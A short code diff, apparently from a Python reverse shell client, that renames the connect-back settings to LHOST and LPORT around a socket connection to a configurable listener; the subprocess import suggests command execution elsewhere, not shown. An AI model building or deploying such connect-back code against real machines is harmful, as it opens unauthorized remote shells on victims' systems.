@@ -72,13 +72,13 @@ import subprocess
 import os
 import sys
 
-REMOTE_HOST = '127.0.0.1' # Change
-REMOTE_PORT = 8080
+LHOST = '127.0.0.1' # Change
+LPORT = 8080
 client = socket.socket()
 print("[-] Connection Initiating...")
 
 try:
-    client.connect((REMOTE_HOST, REMOTE_PORT))
+    client.connect((LHOST, LPORT))
     print("[-] Connection initiated!")
     
 except ConnectionRefusedError:
